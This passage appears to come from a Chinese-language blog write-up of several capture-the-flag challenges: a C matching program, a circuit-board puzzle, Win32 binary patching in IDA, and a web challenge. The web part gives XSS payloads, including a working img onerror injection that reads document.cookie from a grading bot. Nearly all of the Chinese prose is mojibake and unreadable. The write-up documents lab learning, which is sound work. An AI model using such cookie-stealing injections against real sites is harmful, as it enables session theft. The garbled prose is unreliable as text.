</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>loong <span style="color:#a6e22e">scan</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>	loong ret <span style="color:#f92672">=</span> CONST0;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (c <span style="color:#f92672">&gt;=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">&amp;&amp;</span> c <span style="color:#f92672">&lt;=</span> <span style="color:#e6db74">&#39;9&#39;</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		ret.arr[ret.length] <span style="color:#f92672">=</span> c <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>;
</span></span><span style="display:flex;"><span>		c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>		ret.length <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, j <span style="color:#f92672">=</span> ret.length <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;</span> j; i<span style="color:#f92672">++</span>, j<span style="color:#f92672">--</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		ret.arr[i] <span style="color:#f92672">^=</span> ret.arr[j];
</span></span><span style="display:flex;"><span>		ret.arr[j] <span style="color:#f92672">^=</span> ret.arr[i];
</span></span><span style="display:flex;"><span>		ret.arr[i] <span style="color:#f92672">^=</span> ret.arr[j];
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> ret;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>loong <span style="color:#a6e22e">scan_from_str</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> str)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> str[index<span style="color:#f92672">++</span>];
</span></span><span style="display:flex;"><span>	loong ret <span style="color:#f92672">=</span> CONST0;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (c <span style="color:#f92672">&gt;=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">&amp;&amp;</span> c <span style="color:#f92672">&lt;=</span> <span style="color:#e6db74">&#39;9&#39;</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		ret.arr[ret.length] <span style="color:#f92672">=</span> c <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>;
</span></span><span style="display:flex;"><span>		c <span style="color:#f92672">=</span> str[index<span style="color:#f92672">++</span>];
</span></span><span style="display:flex;"><span>		ret.length <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, j <span style="color:#f92672">=</span> ret.length <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;</span> j; i<span style="color:#f92672">++</span>, j<span style="color:#f92672">--</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		ret.arr[i] <span style="color:#f92672">^=</span> ret.arr[j];
</span></span><span style="display:flex;"><span>		ret.arr[j] <span style="color:#f92672">^=</span> ret.arr[i];
</span></span><span style="display:flex;"><span>		ret.arr[i] <span style="color:#f92672">^=</span> ret.arr[j];
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> ret;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">eq</span>(loong a, loong b)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (a.length <span style="color:#f92672">!=</span> b.length) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> a.length; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (a.arr[i] <span style="color:#f92672">!=</span> b.arr[i])
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	loong input <span style="color:#f92672">=</span> <span style="color:#a6e22e">scan</span>();
</span></span><span style="display:flex;"><span>	loong s <span style="color:#f92672">=</span> <span style="color:#a6e22e">scan_from_str</span>(static_in);
</span></span><span style="display:flex;"><span>	loong d0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">scan_from_str</span>(dynamic0_in);
</span></span><span style="display:flex;"><span>	loong d1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">scan_from_str</span>(dynamic1_in);
</span></span><span style="display:flex;"><span>	loong d2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">scan_from_str</span>(dynamic2_in);
</span></span><span style="display:flex;"><span>	loong d3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">scan_from_str</span>(dynamic3_in);
</span></span><span style="display:flex;"><span>	loong d4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">scan_from_str</span>(dynamic4_in);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">eq</span>(input, s))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">puts</span>(static_out);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">eq</span>(input, d0))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">puts</span>(dynamic0_out);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">eq</span>(input, d1))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">puts</span>(dynamic1_out);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">eq</span>(input, d2))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">puts</span>(dynamic2_out);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">eq</span>(input, d3))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">puts</span>(dynamic3_out);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">eq</span>(input, d4))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">puts</span>(dynamic4_out);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>æäº¤ï¼Œå¾—åˆ° flag <code>flag{cpp_need_P1040_std_embed_...}</code></p>
<h2 id="çº¿è·¯æ¿">çº¿è·¯æ¿</h2>
<p>é€åˆ†é¢˜ï¼Œå®‰è£…ä¸€ä¸ª Altium Designer ï¼Œåœ¨æŸä¸ªæ¿å­ä¸Šèƒ½çœ‹åˆ° flag å­—æ ·ï¼ŒæŠŠåé¢çš„é‚£äº›åœ†ç¯ä¸€ä¸ªä¸€ä¸ªåˆ æ‰å°±èƒ½çœ‹åˆ° flag ã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/bWUtEfQvoPVuXZe.png" alt="20221027_11.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<h2 id="flag-è‡ªåŠ¨æœº">Flag è‡ªåŠ¨æœº</h2>
<p>èŒæ–°çš„ç¬¬ä¸€æ¬¡é€†å‘ï¼Œä¸è¿‡è¿™ä¸ªé¢˜å¾ˆå‹å¥½ï¼Œè¾“å‡º flag çš„å‡½æ•°éƒ½ä¸å¯¹è¾“å…¥å€¼åšè¦æ±‚ã€‚</p>
<p>å…ˆæ‰“å¼€ç¨‹åºï¼Œæœ‰ç‹ å¿ƒå¤ºå–å’Œæ”¾æ‰‹ç¦»å¼€ä¸¤ä¸ªæŒ‰é’®ã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/OqcHsBltNbjCrfM.png" alt="20221027_12.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>é¼ æ ‡ç§»åŠ¨åˆ°ç‹ å¿ƒå¤ºå–ä¸Šçš„æ—¶å€™æŒ‰é’®ä¼šéšæœºç§»åŠ¨åˆ°å…¶ä»–ä½ç½®ï¼Œç‚¹å‡»æ”¾æ‰‹ç¦»å¼€åˆ™ç¨‹åºå…³é—­ã€‚</p>
<p>æ‰“å¼€ IDA å¼€å§‹é€†å‘ï¼ŒF5 å‡ºä¼ªä»£ç ã€‚</p>
<p>å…ˆçœ‹ä¸€ä¸‹ <code>_WinMain@16</code> å‡½æ•°ï¼ŒæŠŠé‡Œé¢é‚£äº›ç²‰ç´«è‰²çš„å‡½æ•°æ‹¿å»æœä¸€ä¸‹ï¼Œäº†è§£åˆ°è¿™æ˜¯ä¸ª WinAPI ç¨‹åºã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/pnazNBTuKCGqPQV.png" alt="20221027_13.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>å†æŠŠé‚£äº› <code>sub</code> å‡½æ•°æŒ¨ä¸ªçœ‹ä¸€éï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯ç–‘çš„å‡½æ•° <code>sub_401510</code> ï¼Œé‡Œé¢å†™äº†ä¸ª <code>switch</code> å¯¹ä¼ å…¥çš„ <code>Msg</code> è¿›è¡Œå¤„ç†ã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/NuaFLdS8xbr42zA.png" alt="20221027_14.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>å½“æ»¡è¶³æŸäº›æ¡ä»¶æ—¶ï¼Œè¾“å‡º <code>Congratulations</code> ï¼Œå¹¶æŠŠ flag è¾“å‡ºåˆ° <code>flag_machine.txt</code> ä¸­ã€‚</p>
<p>ç›´æ¥æŠŠæœ€å¤–é¢è¿™ä¸ªè·³è½¬æ”¹åˆ° <code>loc_401840</code> çš„ä½ç½®ï¼ˆå³æ‰“å° flag çš„ä½ç½®ï¼‰ï¼Œè¿è¡Œç¨‹åºã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/wn16qKQLYvhHzrO.png" alt="20221027_15.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>ç»“æœç¨‹åºå¼¹çª—â€œæ­å–œè·å¾— flag â€ï¼ˆå¹¶ä¸”å¼¹çª—å…³ä¸æ‰ï¼‰ï¼ŒåŒæ—¶æœ‰ä¸€ä¸ª <code>flag_machine.txt</code> æ–‡ä»¶å‡ºç°ã€‚</p>
<p>ä½†æ˜¯æ‰“å¼€è¯¥æ–‡ä»¶åå‘ç°é‡Œé¢æ˜¯ä¹±ç ï¼Œåªèƒ½ä¾ç¨€è¾¨åˆ«å‡ºæ¥ f l g { è¿™å››ä¸ªå­—ç¬¦ã€‚</p>
<p>ä¼°è®¡æ˜¯è¿™ä¸ªæ”¹æ³•å¤ªæš´åŠ›äº†ï¼Œéœ€è¦æ¢ä¸€ç§æ›´ä¼˜ç¾çš„æ–¹å¼ã€‚</p>
<p>ä½†æ˜¯åæ¥ç¬”è€…æœ‰è¯•äº†å¾ˆå¤šæš´åŠ›çš„æ”¹æ³•ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºä¿®æ”¹ä»è¿›å…¥ <code>sub_401510</code> ååˆ°è¾“å‡º flag å‰çš„æ¯ä¸€æ¬¡è·³è½¬çš„ä½ç½®ï¼Œä½†éƒ½æ²¡æœ‰æˆåŠŸã€‚</p>
<p>åˆçœ‹åˆ° <code>sub_401510</code> å‡½æ•°åœ¨å¤„ç† <code>case 1u</code> çš„æ—¶å€™ï¼Œä¼¼ä¹ç”Ÿæˆäº†ä¸€äº›çª—ä½“æˆ–è€…ç»„ä»¶ï¼Œé‚£èƒ½å¦é€šè¿‡è°ƒæ¢ç”Ÿæˆç»„ä»¶çš„è¯¦æƒ…ä¿¡æ¯ï¼Œæ¥è°ƒæ¢ä¸¤ä¸ªæŒ‰é’®çš„åŠŸèƒ½å‘¢ï¼Ÿ</p>
<p>è™½ç„¶ç¬”è€…å½“æ—¶æ˜¯é‚£ä¹ˆæƒ³çš„ï¼Œä½†æ˜¯å®åŠ›ä¸å¤Ÿï¼Œä¹Ÿæ²¡æœ‰æ”¹æˆåŠŸã€‚</p>
<p>æ— å¥ˆï¼Œå»æŸ¥é˜… WinAPI çš„å®˜æ–¹æ–‡æ¡£ï¼Œæ–‡æ¡£ç»™å‡ºäº† <code>sub_401510</code> è¿™ä¸ªå‡½æ•°çš„æ ‡å‡†å†™æ³•ï¼Œä»¥åŠä¸åŒ <code>Msg</code> å¯¹åº”çš„å«ä¹‰ã€‚</p>
<p>è¿™æ—¶ç¬”è€…æ‰æ„è¯†åˆ°ä¼ªä»£ç ä¸­çš„ <code>2u</code> <code>0x111u</code> <code>1u</code> åº”å½“æ˜¯ä¸€äº›å®ï¼Œè€Œä¸æ˜¯ç”¨æˆ·è§„å®šçš„æ•°å­—ã€‚</p>
<p>å…¶ä¸­ <code>2u</code> è¡¨ç¤ºæ¥å—åˆ°å…³é—­ä¿¡æ¯ï¼ˆçª—ä½“æ ‡é¢˜æ çš„å…³é—­æŒ‰é’®è¢«æŒ‰ä¸‹ï¼‰ï¼Œ<code>0x111u</code> è¡¨ç¤ºæ¥å—åˆ°äº¤äº’ä¿¡æ¯ï¼ˆæ¯”å¦‚æŒ‰é’®ç»„ä»¶è¢«æŒ‰ä¸‹ï¼‰ï¼Œ<code>1u</code> è¡¨ç¤ºåˆ›å»ºçª—ä½“ï¼ˆå³åˆå§‹åŒ–ï¼‰ã€‚</p>
<p>è€Œ <code>a3</code> åˆ™æ˜¯çª—ä½“å†…ç»„ä»¶çš„ç¼–å·ã€‚</p>
<p>äºæ˜¯ç¬”è€…å°±å»æŠŠ <code>case 1u</code> é‡Œé¢å‰ä¸¤ä¸ªçª—ä½“ç»„ä»¶ï¼ˆæ¨æµ‹æ˜¯ä¸¤ä¸ªæŒ‰é’®ï¼‰çš„ <code>HMENU</code> å€¼å¯¹è°ƒäº†ä¸€ä¸‹ï¼Œç„¶è€Œä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿã€‚</p>
<p>åé¢åˆè¿›è¡Œäº†ä¸€äº›ç±»ä¼¼çš„æ“ä½œï¼Œåˆéƒ½ä»¥å¤±è´¥å‘Šç»ˆäº†ã€‚</p>
<p>ç¬”è€…å†³å®šæ¢æ¢æ€è·¯ï¼Œå°±å»æ‰¾åˆ«çš„å‡½æ•°æ¥çœ‹ï¼Œå‘ç°äº†å¦å¤–ä¸€ä¸ªå¯ç–‘çš„å‡½æ•° <code>pfnSubclass</code> ï¼Œè¿™ä¸ªå‡½æ•°é‡Œæœ‰ <code>rand</code> ï¼Œè€Œä¸”è¿™ä¸ªå‡½æ•°æ˜æ˜¾æ˜¯åœ¨è°ƒæ•´æŒ‰é’®çš„ä½ç½®ï¼ˆä¸ºä»€ä¹ˆæ²¡æœ‰æ—©ä¸€ç‚¹å‘ç°ã€‚ã€‚ã€‚ï¼‰</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/yTS6DLu8znbWkvw.png" alt="20221027_16.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>æŠŠ <code>if</code> çš„æ¡ä»¶æ”¹æˆå…¶ä»–å€¼ï¼Œä½¿å…¶ä¸èƒ½æˆåŠŸï¼ˆå…¶å®æœ€å¼€å§‹æ˜¯æƒ³ç»™ <code>SetWindowPos</code> ä¼ å›ºå®šå€¼ï¼Œä½†æ˜¯åˆä¸çŸ¥é“ä¸ºå•¥å¤±è´¥äº†ï¼‰ã€‚</p>
<p>ç»ˆäºï¼ŒæŒ‰é’®ä¸å†ä¹±åŠ¨äº†ï¼Œä½†æ˜¯ï¼š</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/mbycOq8Dk43GQwU.png" alt="20221027_17.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>å¥½å§ï¼Œçœ‹æ¥è¿™ä¸ªæ˜¯å’Œ <code>114514</code> æœ‰å…³çš„ï¼Œé‚£å°±æŠŠ <code>sub_401510</code> é‡Œå¯¹ <code>lParam == 114514</code> çš„åˆ¤æ–­è·³è½¬ä» <code>jz</code> æ”¹ä¸º <code>jnz</code> ï¼Œå†è¿è¡Œç¨‹åºï¼Œæ‹¿åˆ° flag <code>flag{Y0u_rea1ly_kn0w_Win32API_...}</code> ã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/HdnNql1T9jh2yrP.png" alt="20221027_18.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>é¢˜åˆ°è¿™é‡Œæ˜¯å†™å®Œäº†ï¼Œä½†æ˜¯è¿˜æœ‰é—®é¢˜ã€‚</p>
<p><code>sub_401F8A</code> åœ¨è§£ç  flag çš„æ—¶å€™éœ€è¦ä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œåœ¨ <code>lParam == 114514</code> çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå‚æ•°å›ºç„¶æ˜¯ <code>114514</code> ï¼Œä½†æ˜¯åœ¨ä¿®æ”¹äº†ä¸Šè¿°é€»è¾‘ä¹‹åï¼Œä¼ å…¥çš„å‚æ•°æ˜¯ä¸å¯çŸ¥çš„ã€‚</p>
<p>å¦‚æœ <code>sub_401F8A</code> å‡½æ•°åœ¨è§£ç  flag çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦è¿™ä¸ªå€¼ä½œä¸ºå¯†é’¥ï¼Œé‚£ä¹ˆè¿˜éœ€è¦ä¿®æ”¹ç¨‹åºä½¿å¾—ä¼ å…¥çš„å€¼æ˜¯ <code>114514</code> ï¼Œå¦åˆ™åº”å½“è§£ç å‡ºä¹±ç ã€‚</p>
<p>è€Œè¿™ä¸ªé¢˜å¹¶æ²¡æœ‰åšè¿™æ ·çš„è¦æ±‚ï¼Œå‡ºé¢˜äººè¿˜æ˜¯ä»æ…ˆäº†ã€‚ã€‚ã€‚</p>
<p>å¦å¤–ï¼š IDA å¥½éš¾ç”¨ï¼Œç”¨ä¿®è¡¥ç¨‹åºé‡Œé¢çš„â€œæ±‡ç¼–â€æ“ä½œä¿®æ”¹æ“ä½œæ•°åï¼Œæ‰“è¡¥ä¸çš„æ—¶å€™æ˜¾ç¤º Patch 0/0 ï¼Œ</p>
<p>å³ IDA æ²¡æŠŠâ€œä¿®è¡¥ç¨‹åº-æ±‡ç¼–â€æ“ä½œåšçš„ä¿®æ”¹çœŸæ­£ä¿®è¡¥åˆ°ç¨‹åºä¸­ï¼Œåªæœ‰é€šè¿‡â€œå•å­—èŠ‚â€ã€â€œåŒå­—èŠ‚â€åšçš„ä¿®æ”¹æ‰ä¼šè¢«æ‰“å…¥ç¨‹åºä¸­ã€‚</p>
<p>è¿™å°±å¯¼è‡´å‰å‡ å¤©åšè¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œå¥½å¤šå¸¸æ•°ä¿®æ”¹å…¶å®éƒ½æ²¡ä¿®æ”¹æˆåŠŸï¼Œç¨‹åºè‡ªç„¶ä¹Ÿå°±è·‘å¾—å¥‡å¥‡æ€ªæ€ªçš„ã€‚</p>
<h2 id="å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ ">å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ </h2>
<p>å…ˆçœ‹çœ‹å‰ç«¯ï¼Œæœ‰ä¸€ä¸ªè¡¨å•ï¼Œå¯ä»¥æäº¤å§“åå’Œç­”æ¡ˆï¼Œæäº¤ä¹‹åè·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œå¹¶ä¸”å§“åä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p>å†å»çœ‹åç«¯ï¼Œç”¨ webdriver æµè§ˆäº†ä¸€ä¸ªç§˜å¯†ç½‘é¡µï¼Œåœ¨ cookie é‡Œæ”¾äº†ä¸ª flag ï¼Œç„¶ååˆå»è®¿é—®äº†æˆç»©é¡µé¢ï¼Œå¹¶ä¸”æ‰“å° <code>greeting</code> å’Œ <code>score</code> ã€‚</p>
<p>å› æ­¤é¦–å…ˆæƒ³åˆ°çš„æ˜¯æŠŠ cookie æ”¾åœ¨ <code>greeting</code> æˆ–è€… <code>score</code> é‡Œé¢ï¼Œç„¶åè¾“å‡ºï¼Œç«é€Ÿåšå‡ºäº†å¦‚ä¸‹ä»£ç </p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">greeting</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;greeting&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">greeting</span>.<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">=</span><span style="color:#e6db74">`</span><span style="color:#e6db74">${</span>document.<span style="color:#a6e22e">cookie</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
</span></span></code></pre></div><p>æ”¾åˆ°æµè§ˆå™¨æ§åˆ¶å°é‡Œè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¯è¡Œï¼Œä½†æ˜¯è¦æ€ä¹ˆæ³¨å…¥å‘¢ï¼Ÿ</p>
<p>å…ˆè¯•äº†ä¸€ä¸‹æŠŠä¸Šé¢ä»£ç æ”¾åˆ°è¡¨å•çš„åå­—é‚£é‡Œ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">greeting</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;greeting&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">greeting</span>.<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">=</span><span style="color:#e6db74">`</span><span style="color:#e6db74">${</span>document.<span style="color:#a6e22e">cookie</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>æäº¤ä¹‹åçœ‹ F12 ï¼Œä»£ç ç¡®å®æäº¤ä¸Šå»äº†ï¼Œä½†æ˜¯ä¼¼ä¹æ²¡æœ‰è¿è¡Œï¼Œä»£ç é¢œè‰²æ˜¯é»‘è‰²çš„ï¼Œå¯èƒ½ç”šè‡³æ²¡æœ‰è¢«è§£æã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/z1LhkKUrVJbym6Q.png" alt="20221027_19.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>å»æœäº†ä¸€ä¸‹â€œjsæ³¨å…¥ï¼Œscriptæ²¡æœ‰è¢«è§£æâ€ï¼Œæ‰¾åˆ°è¿™ä¸€ç¯‡æ–‡ç« ï¼Œæåˆ°å‰åç«¯åˆ†ç¦»çš„æ–¹å¼å¯ä»¥é¿å…è¿™ç§æ³¨å…¥ã€‚</p>
<p><a href="https://blog.csdn.net/qq_41914181/article/details/109131138" target="_blank" rel="noopener">https://blog.csdn.net/qq_41914181/article/details/109131138</a></p>
<p>é‚£è¿˜èƒ½æ€ä¹ˆæ³¨å…¥ï¼Ÿåˆè¯•äº†ä¸€ä¸‹å‘åç«¯æäº¤é“¾æ¥</p>
<pre tabindex="0"><code>javascript:{greeting=document.getElementById(&#39;greeting&#39;);greeting.innerHTML=`${document.cookie}`;}
</code></pre><p>ç»“æœæç¤º <code>JavaScript Error: Did you give me correct URL?</code></p>
<p>æ¨æµ‹å¯èƒ½æ˜¯åˆšå¼€å§‹è®¿é—®çš„ç§˜å¯†é“¾æ¥é‡Œé¢æ²¡æœ‰ <code>greeting</code> è¿™ä¸ªå…ƒç´ ï¼Œå°±åˆå°è¯•ç€åœ¨ä»£ç é‡Œåˆ›å»ºè¿™ä¸ªå…ƒç´ ï¼Œå†æŠŠ cookie å†™è¿›å»ï¼Œä¹Ÿä»¥å¤±è´¥å‘Šç»ˆã€‚</p>
<p>äºæ˜¯ç¬”è€…å»æäº†ä¸ª chromedriver ï¼Œåœ¨æœ¬æœºè¯•äº†ä¸€ä¸‹ã€‚</p>
<p>å‘ç°é—®é¢˜å‡ºåœ¨ webdriver å¯¹ JS å‘½ä»¤è¿›è¡Œ Get æ“ä½œçš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šç›´æ¥å…³é—­ï¼Œç„¶åæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>è¿™ä¸‹åœ°å€æ  JS æ³¨å…¥ä¹Ÿä¸ç®¡ç”¨äº†ï¼Œæ— å¥ˆï¼Œç»§ç»­å»æœç´¢â€œJS æ³¨å…¥ innerHTMLâ€ï¼Œæ‰¾åˆ°äº†è¿™æ ·ä¸€ç¯‡æ–‡ç« </p>
<p><a href="https://blog.csdn.net/jimmyleeee/article/details/123003548" target="_blank" rel="noopener">https://blog.csdn.net/jimmyleeee/article/details/123003548</a></p>
<p>å»è¯•ä¸€ä¸‹ï¼Œæäº¤ä»¥ä¸‹å§“å</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">greeting</span><span style="color:#f92672">=</span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;greeting&#39;</span>);<span style="color:#a6e22e">greeting</span>.<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">=</span><span style="color:#e6db74">`</span><span style="color:#e6db74">${</span>document.<span style="color:#a6e22e">cookie</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;}<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>æˆåŠŸæ‹¿åˆ° flag <code>flag{xS5_1OI_is_N0t_SOHARD_...}</code></p>
<p>ï¼ˆåˆå­¦åˆ°äº†æ–°çŸ¥è¯†ï¼Œå‡†å¤‡å» xls çš„åšå®¢ä¸Šç©ç©æ³¨å…¥</p>
<p>ï¼ˆç©å®Œå›æ¥äº†ï¼Œxls çš„åšå®¢ç›´æ¥æŠŠ <code>onerror</code> éƒ¨åˆ†ç»™åˆ æ‰äº†</p>
<h2 id="æ¯çª—é¹…å½±">æ¯çª—é¹…å½±</h2>
<p>è¿™ä¸ªé¢˜é¢˜ç›®é‚£ä¹ˆé•¿ï¼Œåˆæ˜¯çº¯çº¯çš„ nc é¢˜ç›®ï¼Œè¿˜æ‰“ç€ binary æ ‡ç­¾ï¼Œçœ‹ä¸€çœ¼å°±è§‰å¾—åŠé€€ã€‚</p>
<p>ä½†æ˜¯è¯•äº†ä¸€ä¸‹ç¬¬ä¸€é¢˜ï¼Œæ„å¤–çš„ç®€å•ã€‚</p>
